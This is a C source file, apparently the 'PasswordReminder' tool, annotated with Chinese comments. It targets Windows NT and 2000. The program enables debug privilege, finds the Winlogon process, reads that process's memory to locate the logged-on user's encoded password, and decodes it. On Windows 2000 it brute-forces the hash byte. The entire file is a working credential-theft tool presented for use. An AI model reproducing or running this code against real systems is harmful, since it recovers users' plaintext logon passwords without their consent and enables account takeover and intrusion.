#include <windows.h>   
#include <tchar.h>   
#include <stdio.h>   
#include <stdlib.h>   
  
typedef struct _UNICODE_STRING   
{   
    USHORT Length;   
    USHORT MaximumLength;   
    PWSTR Buffer;   
} UNICODE_STRING, *PUNICODE_STRING;   
  
// Undocumented typedef's   
typedef struct _QUERY_SYSTEM_INFORMATION   
{   
    DWORD GrantedAccess;   
    DWORD PID;   
    WORD HandleType;   
    WORD HandleId;   
    DWORD Handle;   
} QUERY_SYSTEM_INFORMATION, *PQUERY_SYSTEM_INFORMATION;   
typedef struct _PROCESS_INFO_HEADER   
{   
    DWORD Count;   
    DWORD Unk04;   
    DWORD Unk08;   
} PROCESS_INFO_HEADER, *PPROCESS_INFO_HEADER;   
typedef struct _PROCESS_INFO   
{   
    DWORD LoadAddress;   
    DWORD Size;   
    DWORD Unk08;   
    DWORD Enumerator;   
    DWORD Unk10;   
    char Name [0x108];   
} PROCESS_INFO, *PPROCESS_INFO;   
typedef struct _ENCODED_PASSWORD_INFO   
{   
    DWORD HashByte;   
    DWORD Unk04;   
    DWORD Unk08;   
    DWORD Unk0C;   
    FILETIME LoggedOn;   
    DWORD Unk18;   
    DWORD Unk1C;   
    DWORD Unk20;   
    DWORD Unk24;   
    DWORD Unk28;   
    UNICODE_STRING EncodedPassword;   
} ENCODED_PASSWORD_INFO, *PENCODED_PASSWORD_INFO;   
  
typedef DWORD (__stdcall *PFNNTQUERYSYSTEMINFORMATION)  (DWORD, PVOID, DWORD, PDWORD);   
typedef PVOID (__stdcall *PFNRTLCREATEQUERYDEBUGBUFFER) (DWORD, DWORD);   
typedef DWORD (__stdcall *PFNRTLQUERYPROCESSDEBUGINFORMATION) (DWORD, DWORD, PVOID);   
typedef void (__stdcall *PFNRTLDESTROYQUERYDEBUGBUFFER) (PVOID);   
typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING)  (BYTE, PUNICODE_STRING);   
  
// Private Prototypes   
BOOL IsWinNT (void);   
BOOL IsWin2K (void);   
BOOL AddDebugPrivilege (void);   
DWORD FindWinLogon (void);   
BOOL LocatePasswordPageWinNT (DWORD, PDWORD);   
BOOL LocatePasswordPageWin2K (DWORD, PDWORD);   
void DisplayPasswordWinNT (void);   
void DisplayPasswordWin2K (void);   
  
// Global Variables   
PFNNTQUERYSYSTEMINFORMATION pfnNtQuerySystemInformation;   
PFNRTLCREATEQUERYDEBUGBUFFER pfnRtlCreateQueryDebugBuffer;   
PFNRTLQUERYPROCESSDEBUGINFORMATION pfnRtlQueryProcessDebugInformation;   
PFNRTLDESTROYQUERYDEBUGBUFFER pfnRtlDestroyQueryDebugBuffer;   
PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString;   
  
DWORD PasswordLength = 0;   
PVOID RealPasswordP = NULL;   
PVOID PasswordP = NULL;   
DWORD HashByte = 0;  
wchar_t UserName [0x400];   
wchar_t UserDomain [0x400];   
  
int __cdecl main( int argc, char* argv[] )   
{   
    printf( "\n\t To Find Password in the Winlogon process\n" );  
    printf( " Usage: %s DomainName UserName PID-of-WinLogon\n\n", argv[0] );   
  
    if ((!IsWinNT ())   
            &&   
        (!IsWin2K ()))   
    {   
        printf ("Windows NT or Windows 2000 are required.\n");   
        system("pause");
        return (0);   
    }   
  
    // Add debug privilege to PasswordReminder -   
    // this is needed for the search for Winlogon.   
    // 增加PasswordReminder的权限   
    // 使得PasswordReminder可以打开并调试Winlogon进程   
    if (!AddDebugPrivilege ())   
    {   
        printf   
            ("Unable to add debug privilege.\n");   
        system("pause");
        return (0);   
    }   
    printf ("The debug privilege has been added to PasswordReminder.\n");   
  
    // 获得几个未公开API的入口地址   
    HINSTANCE hNtDll =   
        LoadLibrary   
            ("NTDLL.DLL");   
    pfnNtQuerySystemInformation =   
        (PFNNTQUERYSYSTEMINFORMATION) GetProcAddress   
            (hNtDll,   
            "NtQuerySystemInformation");   
    pfnRtlCreateQueryDebugBuffer =   
        (PFNRTLCREATEQUERYDEBUGBUFFER) GetProcAddress   
            (hNtDll,   
            "RtlCreateQueryDebugBuffer");   
    pfnRtlQueryProcessDebugInformation =   
        (PFNRTLQUERYPROCESSDEBUGINFORMATION) GetProcAddress   
            (hNtDll,   
            "RtlQueryProcessDebugInformation");   
    pfnRtlDestroyQueryDebugBuffer =   
        (PFNRTLDESTROYQUERYDEBUGBUFFER) GetProcAddress   
            (hNtDll,   
            "RtlDestroyQueryDebugBuffer");   
    pfnRtlRunDecodeUnicodeString =   
        (PFNTRTLRUNDECODEUNICODESTRING) GetProcAddress   
            (hNtDll,   
            "RtlRunDecodeUnicodeString");   
  
    // Locate WinLogon's PID - need debug privilege and admin rights.   
    // 获得Winlogon进程的PID   
    // 这里作者使用了几个Native API，其实使用PSAPI一样可以   
    DWORD WinLogonPID =   
        argc > 3 ? atoi( argv[3] ) : FindWinLogon () ;   
    if (WinLogonPID == 0)   
    {   
        printf   
            ("PasswordReminder is unable to find WinLogon or you are using NWGINA.DLL.\n");   
        printf   
            ("PasswordReminder is unable to find the password in memory.\n");   
        FreeLibrary (hNtDll);   
        system("pause");
        return (0);   
    }   
  
    printf("The WinLogon process id is %d (0x%8.8lx).\n",   
            WinLogonPID, WinLogonPID);   
  
    // Set values to check memory block against.   
    // 初始化几个和用户账号相关的变量   
    memset(UserName, 0, sizeof (UserName));   
    memset(UserDomain, 0, sizeof (UserDomain));   
    if( argc > 2 )  
    {     
        mbstowcs( UserName, argv[2], sizeof(UserName)/sizeof(*UserName) );  
        mbstowcs( UserDomain, argv[1], sizeof(UserDomain)/sizeof(*UserDomain) );  
    }else  
    {  
        GetEnvironmentVariableW(L"USERNAME", UserName, 0x400);   
        GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400);   
    }  
    printf( " To find %S\\%S password in process %d ...\n", UserDomain, UserName, WinLogonPID );  
  
    // Locate the block of memory containing   
    // the password in WinLogon's memory space.   
    // 在Winlogon进程中定位包含Password的内存块   
    BOOL FoundPasswordPage = FALSE;   
    if (IsWin2K ())   
        FoundPasswordPage =   
            LocatePasswordPageWin2K   
                (WinLogonPID,   
                &PasswordLength);   
    else   
        FoundPasswordPage =   
            LocatePasswordPageWinNT   
                (WinLogonPID,   
                &PasswordLength);   
  
    if (FoundPasswordPage)   
    {   
        if (PasswordLength == 0)   
        {   
            printf   
                ("The logon information is: %S/%S.\n",   
                UserDomain,   
                UserName);   
            printf   
                ("There is no password.\n");   
        }   
        else   
        {   
            printf   
                ("The encoded password is found at 0x%8.8lx and has a length of %d.\n",   
                RealPasswordP,   
                PasswordLength);   
            // Decode the password string.   
            if (IsWin2K ())   
                DisplayPasswordWin2K ();   
            else   
                DisplayPasswordWinNT ();   
        }   
    }   
    else   
        printf   
            ("PasswordReminder is unable to find the password in memory.\n");   
  
    FreeLibrary   
        (hNtDll);   
        system("pause");
    return (0);   
} // main   
  
//   
// IsWinNT函数用来判断操作系统是否WINNT   
//   
BOOL   
    IsWinNT   
        (void)   
{   
    OSVERSIONINFO OSVersionInfo;   
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);   
    if (GetVersionEx   
            (&OSVersionInfo))   
        return (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT);   
    else   
        return (FALSE);   
} // IsWinNT   
  
  
//   
// IsWin2K函数用来判断操作系统是否Win2K   
//   
BOOL   
    IsWin2K   
        (void)   
{   
    OSVERSIONINFO OSVersionInfo;   
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);   
    if (GetVersionEx   
            (&OSVersionInfo))   
        return ((OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)   
                    &&   
                (OSVersionInfo.dwMajorVersion == 5));   
    else   
        return (FALSE);   
} // IsWin2K   
  
  
//   
// AddDebugPrivilege函数用来申请调试Winlogon进程的特权   
//   
BOOL   
    AddDebugPrivilege   
        (void)   
{   
    HANDLE Token;   
    TOKEN_PRIVILEGES TokenPrivileges, PreviousState;   
    DWORD ReturnLength = 0;   
    if (OpenProcessToken   
            (GetCurrentProcess (),   
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,   
            &Token))   
        if (LookupPrivilegeValue   
                (NULL,   
                "SeDebugPrivilege",   
                &TokenPrivileges.Privileges[0].Luid))   
        {   
            TokenPrivileges.PrivilegeCount = 1;   
            TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
            return   
                (AdjustTokenPrivileges   
                    (Token,   
                    FALSE,   
                    &TokenPrivileges,   
                    sizeof (TOKEN_PRIVILEGES),   
                    &PreviousState,   
                    &ReturnLength));   
        }   
    return (FALSE);   
} // AddDebugPrivilege   
  
  
//   
// Note that the following code eliminates the need   
// for PSAPI.DLL as part of the executable.   
// FindWinLogon函数用来寻找WinLogon进程   
// 由于作者使用的是Native API，因此不需要PSAPI的支持   
//   
DWORD   
    FindWinLogon   
        (void)   
{   
#define INITIAL_ALLOCATION 0x100   
    DWORD rc = 0;   
    DWORD SizeNeeded = 0;   
    PVOID InfoP =   
        HeapAlloc   
            (GetProcessHeap (),   
            HEAP_ZERO_MEMORY,   
            INITIAL_ALLOCATION);   
    // Find how much memory is required.   
    pfnNtQuerySystemInformation   
        (0x10,   
        InfoP,   
        INITIAL_ALLOCATION,   
        &SizeNeeded);   
    HeapFree   
        (GetProcessHeap (),   
        0,   
        InfoP);   
    // Now, allocate the proper amount of memory.   
    InfoP =   
        HeapAlloc   
            (GetProcessHeap (),   
            HEAP_ZERO_MEMORY,   
            SizeNeeded);   
    DWORD SizeWritten = SizeNeeded;   
    if (pfnNtQuerySystemInformation   
            (0x10,   
            InfoP,   
            SizeNeeded,   
            &SizeWritten))   
    {   
        HeapFree   
            (GetProcessHeap (),   
            0,   
            InfoP);   
        return (0);   
    }   
    DWORD NumHandles = SizeWritten / sizeof (QUERY_SYSTEM_INFORMATION);   
    if (NumHandles == 0)   
    {   
        HeapFree   
            (GetProcessHeap (),   
            0,   
            InfoP);   
        return (0);   
    }   
    PQUERY_SYSTEM_INFORMATION QuerySystemInformationP =   
        (PQUERY_SYSTEM_INFORMATION) InfoP;   
    DWORD i;   
    for (i = 1; i <= NumHandles; i++)   
    {   
        // "5" is the value of a kernel object type process.   
        if (QuerySystemInformationP->HandleType == 5)   
        {   
            PVOID DebugBufferP =   
                pfnRtlCreateQueryDebugBuffer   
                    (0,   
                    0);   
            if (pfnRtlQueryProcessDebugInformation   
                    (QuerySystemInformationP->PID,   
                    1,   
                    DebugBufferP) == 0)   
            {   
                PPROCESS_INFO_HEADER ProcessInfoHeaderP =   
                    (PPROCESS_INFO_HEADER) ((DWORD) DebugBufferP + 0x60);   
                DWORD Count =   
                    ProcessInfoHeaderP->Count;   
                PPROCESS_INFO ProcessInfoP =   
                    (PPROCESS_INFO) ((DWORD) ProcessInfoHeaderP + sizeof (PROCESS_INFO_HEADER));   
                if (strstr (_strupr (ProcessInfoP->Name), "WINLOGON") != 0)   
                {   
                    DWORD i;   
                    DWORD dw = (DWORD) ProcessInfoP;   
                    for (i = 0; i < Count; i++)   
                    {   
                        dw += sizeof (PROCESS_INFO);   
                        ProcessInfoP = (PPROCESS_INFO) dw;   
                        if (strstr (_strupr (ProcessInfoP->Name), "NWGINA") != 0)   
                            return (0);   
                        if (strstr (_strupr (ProcessInfoP->Name), "MSGINA") == 0)   
                            rc =   
                                QuerySystemInformationP->PID;   
                    }   
                    if (DebugBufferP)   
                        pfnRtlDestroyQueryDebugBuffer   
                            (DebugBufferP);   
                    HeapFree   
                        (GetProcessHeap (),   
                        0,   
                        InfoP);   
                    return (rc);   
                }   
            }   
            if (DebugBufferP)   
                pfnRtlDestroyQueryDebugBuffer   
                    (DebugBufferP);   
        }   
        DWORD dw = (DWORD) QuerySystemInformationP;   
        dw += sizeof (QUERY_SYSTEM_INFORMATION);   
        QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION) dw;   
    }   
    HeapFree   
        (GetProcessHeap (),   
        0,   
        InfoP);   
    return (rc);   
} // FindWinLogon   
  
//   
// LocatePasswordPageWinNT函数用来在NT中找到用户密码   
//   
BOOL   
    LocatePasswordPageWinNT   
        (DWORD WinLogonPID,   
        PDWORD PasswordLength)   
{   
#define USER_DOMAIN_OFFSET_WINNT    0x200   
#define USER_PASSWORD_OFFSET_WINNT    0x400   
    BOOL rc = FALSE;   
    HANDLE WinLogonHandle =   
        OpenProcess   
            (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,   
            FALSE,   
            WinLogonPID);   
    if (WinLogonHandle == 0)   
        return (rc);   
    *PasswordLength = 0;   
    SYSTEM_INFO SystemInfo;   
    GetSystemInfo   
        (&SystemInfo);   
    DWORD PEB = 0x7ffdf000;   
    DWORD BytesCopied = 0;   
    PVOID PEBP =   
        HeapAlloc   
            (GetProcessHeap (),   
            HEAP_ZERO_MEMORY,   
            SystemInfo.dwPageSize);   
    if (!ReadProcessMemory   
            (WinLogonHandle,   
            (PVOID) PEB,   
            PEBP,   
            SystemInfo.dwPageSize,   
            &BytesCopied))   
    {   
        CloseHandle   
            (WinLogonHandle);   
        return (rc);   
    }   
    // Grab the value of the 2nd DWORD in the TEB.   
    PDWORD WinLogonHeap = (PDWORD) ((DWORD) PEBP + (6 * sizeof (DWORD)));   
    MEMORY_BASIC_INFORMATION MemoryBasicInformation;   
    if (VirtualQueryEx   
            (WinLogonHandle,   
            (PVOID) *WinLogonHeap,   
            &MemoryBasicInformation,   
            sizeof (MEMORY_BASIC_INFORMATION)))   
        if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT)   
                &&   
            ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0))   
        {   
            PVOID WinLogonMemP =   
                HeapAlloc   
                    (GetProcessHeap (),   
                    HEAP_ZERO_MEMORY,   
                    MemoryBasicInformation.RegionSize);   
            if (ReadProcessMemory   
                    (WinLogonHandle,   
                    (PVOID) *WinLogonHeap,   
                    WinLogonMemP,   
                    MemoryBasicInformation.RegionSize,   
                    &BytesCopied))   
            {   
                DWORD i = (DWORD) WinLogonMemP;   
                DWORD UserNamePos = 0;   
                // The order in memory is UserName followed by the UserDomain.   
                // 在内存中搜索UserName和UserDomain字符串   
                do   
                {   
                    if ((wcsicmp (UserName, (wchar_t *) i) == 0)   
                            &&   
                        (wcsicmp (UserDomain, (wchar_t *) (i + USER_DOMAIN_OFFSET_WINNT)) == 0))   
                    {   
                        UserNamePos = i;   
                        break;   
                    }   
                    i += 2;   
                } while (i < (DWORD) WinLogonMemP + MemoryBasicInformation.RegionSize);   
                if (UserNamePos)   
                {   
                    PENCODED_PASSWORD_INFO EncodedPasswordInfoP =   
                        (PENCODED_PASSWORD_INFO)   
                            ((DWORD) UserNamePos + USER_PASSWORD_OFFSET_WINNT);   
                    FILETIME LocalFileTime;   
                    SYSTEMTIME SystemTime;   
                    if (FileTimeToLocalFileTime   
                        (&EncodedPasswordInfoP->LoggedOn,   
                        &LocalFileTime))   
                        if (FileTimeToSystemTime   
                            (&LocalFileTime,   
                            &SystemTime))   
                            printf   
                                ("You logged on at %d/%d/%d %d:%d:%d\n",   
                                SystemTime.wMonth,   
                                SystemTime.wDay,   
                                SystemTime.wYear,   
                                SystemTime.wHour,   
                                SystemTime.wMinute,   
                                SystemTime.wSecond);   
                    *PasswordLength =   
                        (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof (wchar_t);   
                    // NT就是好，hash-byte直接放在编码中:)   
                    HashByte =   
                        (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8;   
                    RealPasswordP =   
                        (PVOID) (*WinLogonHeap +   
                            (UserNamePos - (DWORD) WinLogonMemP) +   
                            USER_PASSWORD_OFFSET_WINNT + 0x34);   
                    PasswordP =   
                        (PVOID) ((PBYTE) (UserNamePos +     
                            USER_PASSWORD_OFFSET_WINNT + 0x34));   
                    rc = TRUE;   
                }   
            }   
        }   
  
    HeapFree   
        (GetProcessHeap (),   
        0,   
        PEBP);   
    CloseHandle   
        (WinLogonHandle);   
    return (rc);   
} // LocatePasswordPageWinNT   
  
  
//   
// LocatePasswordPageWin2K函数用来在Win2K中找到用户密码   
//   
BOOL   
    LocatePasswordPageWin2K   
        (DWORD WinLogonPID,   
        PDWORD PasswordLength)   
{   
#define USER_DOMAIN_OFFSET_WIN2K    0x400   
#define USER_PASSWORD_OFFSET_WIN2K    0x800   
    HANDLE WinLogonHandle =   
        OpenProcess   
            (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,   
            FALSE,   
            WinLogonPID);   
    if (WinLogonHandle == 0)   
        return (FALSE);   
    *PasswordLength = 0;   
    SYSTEM_INFO SystemInfo;   
    GetSystemInfo   
        (&SystemInfo);   
    DWORD i = (DWORD) SystemInfo.lpMinimumApplicationAddress;   
    DWORD MaxMemory = (DWORD) SystemInfo.lpMaximumApplicationAddress;   
    DWORD Increment = SystemInfo.dwPageSize;   
    MEMORY_BASIC_INFORMATION MemoryBasicInformation;   
    while (i < MaxMemory)   
    {   
        if (VirtualQueryEx   
                (WinLogonHandle,   
                (PVOID) i,   
                &MemoryBasicInformation,   
                sizeof (MEMORY_BASIC_INFORMATION)))   
        {   
            Increment = MemoryBasicInformation.RegionSize;   
            if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT)   
                    &&   
                ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0))   
            {   
                PVOID RealStartingAddressP =   
                    HeapAlloc   
                        (GetProcessHeap (),   
                        HEAP_ZERO_MEMORY,   
                        MemoryBasicInformation.RegionSize);   
                DWORD BytesCopied = 0;   
                if (ReadProcessMemory   
                        (WinLogonHandle,   
                        (PVOID) i,   
                        RealStartingAddressP,   
                        MemoryBasicInformation.RegionSize,   
                        &BytesCopied))   
                {   
                    // 在WinLogon的内存空间中寻找UserName和DomainName的字符串   
                    if ((wcsicmp ((wchar_t *) RealStartingAddressP, UserName) == 0)   
                            &&   
                        (wcsicmp ((wchar_t *) ((DWORD) RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0))   
                    {   
                        RealPasswordP = (PVOID) (i + USER_PASSWORD_OFFSET_WIN2K);   
                        PasswordP = (PVOID) ((DWORD) RealStartingAddressP + USER_PASSWORD_OFFSET_WIN2K);   
                        // Calculate the length of encoded unicode string.   
                        // 计算出密文的长度   
                        PBYTE p = (PBYTE) PasswordP;   
                        DWORD Loc = (DWORD) p;   
                        DWORD Len = 0;   
                        if ((*p == 0)   
                                &&   
                            (* (PBYTE) ((DWORD) p + 1) == 0))   
                            ;   
                        else   
                            do   
                            {   
                                Len++;   
                                Loc += 2;   
                                p = (PBYTE) Loc;   
                            } while   
                                (*p != 0);   
                        *PasswordLength = Len;   
                        CloseHandle   
                            (WinLogonHandle);   
                        return (TRUE);   
                    }   
                }   
                HeapFree   
                    (GetProcessHeap (),   
                    0,   
                    RealStartingAddressP);   
            }   
        }   
        else   
            Increment = SystemInfo.dwPageSize;   
        // Move to next memory block.   
        i += Increment;   
    }   
    CloseHandle   
        (WinLogonHandle);   
    return (FALSE);   
} // LocatePasswordPageWin2K   
  
  
//   
// DisplayPasswordWinNT函数用来在NT中解码用户密码   
//   
void   
    DisplayPasswordWinNT   
        (void)   
{   
    UNICODE_STRING EncodedString;   
    EncodedString.Length =   
        (WORD) PasswordLength * sizeof (wchar_t);   
    EncodedString.MaximumLength =   
        ((WORD) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t);   
    EncodedString.Buffer =   
        (PWSTR) HeapAlloc   
            (GetProcessHeap (),   
            HEAP_ZERO_MEMORY,   
            EncodedString.MaximumLength);   
    CopyMemory   
        (EncodedString.Buffer,   
        PasswordP,   
        PasswordLength * sizeof (wchar_t));   
    // Finally - decode the password.   
    // Note that only one call is required since the hash-byte   
    // was part of the orginally encoded string.   
    // 在NT中，hash-byte是包含在编码中的   
    // 因此只需要直接调用函数解码就可以了   
    pfnRtlRunDecodeUnicodeString   
        ((BYTE) HashByte,   
        &EncodedString);   
    printf   
        ("The logon information is: %S/%S/%S.\n",   
        UserDomain,   
        UserName,   
        EncodedString.Buffer);   
    printf   
        ("The hash byte is: 0x%2.2x.\n",   
        HashByte);   
    HeapFree   
        (GetProcessHeap (),   
        0,   
        EncodedString.Buffer);   
} // DisplayPasswordWinNT   
  
//   
// DisplayPasswordWin2K函数用来在Win2K中解码用户密码   
//   
void   
    DisplayPasswordWin2K   
        (void)   
{   
    DWORD i, Hash = 0;   
    UNICODE_STRING EncodedString;   
    EncodedString.Length =   
        (USHORT) PasswordLength * sizeof (wchar_t);   
    EncodedString.MaximumLength =   
        ((USHORT) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t);   
    EncodedString.Buffer =   
        (PWSTR) HeapAlloc   
            (GetProcessHeap (),   
            HEAP_ZERO_MEMORY,   
            EncodedString.MaximumLength);   
    // This is a brute force technique since the hash-byte   
    // is not stored as part of the encoded string - :>(.   
    // 因为在Win2K中hash-byte并不存放在编码中   
    // 所以在这里进行的是暴力破解   
    // 下面的循环中i就是hash-byte   
    // 我们将i从0x00到0xff分别对密文进行解密   
    // 如果有一个hash-byte使得所有密码都是可见字符，就认为是有效的   
    // 这个算法实际上是从概率角度来解码的   
    // 因为如果hash-byte不对而解密出来的密码都是可见字符的概率非常小   
    for (i = 0; i <= 0xff; i++)   
    {   
        CopyMemory   
            (EncodedString.Buffer,   
            PasswordP,   
            PasswordLength * sizeof (wchar_t));   
        // Finally - try to decode the password.   
        // 使用i作为hash-byte对密文进行解码   
        pfnRtlRunDecodeUnicodeString   
            ((BYTE) i,   
            &EncodedString);   
        // Check for a viewable password.   
        // 检查解码出的密码是否完全由可见字符组成   
        // 如果是则认为是正确的解码   
        PBYTE p = (PBYTE) EncodedString.Buffer;   
        BOOL Viewable = TRUE;   
        DWORD j, k;   
        for (j = 0; (j < PasswordLength) && Viewable; j++)   
        {   
            if ((*p)   
                    &&   
                (* (PBYTE)(DWORD (p) + 1) == 0))   
            {   
                if (*p < 0x20)   
                    Viewable = FALSE;   
                if (*p > 0x7e)   
                    Viewable = FALSE;   
                //0x20是空格，0X7E是~，所有密码允许使用的可见字符都包括在里面了   
            }   
            else   
                Viewable = FALSE;   
            k = DWORD (p);   
            k++; k++;   
            p = (PBYTE) k;   
        }   
        if (Viewable)   
        {   
            printf   
                ("The logon information is: %S/%S/%S.\n",   
                UserDomain,   
                UserName,   
                EncodedString.Buffer);   
            printf   
                ("The hash byte is: 0x%2.2x.\n",   
                i);   
        }   
    }   
    HeapFree   
        (GetProcessHeap (),   
        0,   
        EncodedString.Buffer);   
}  
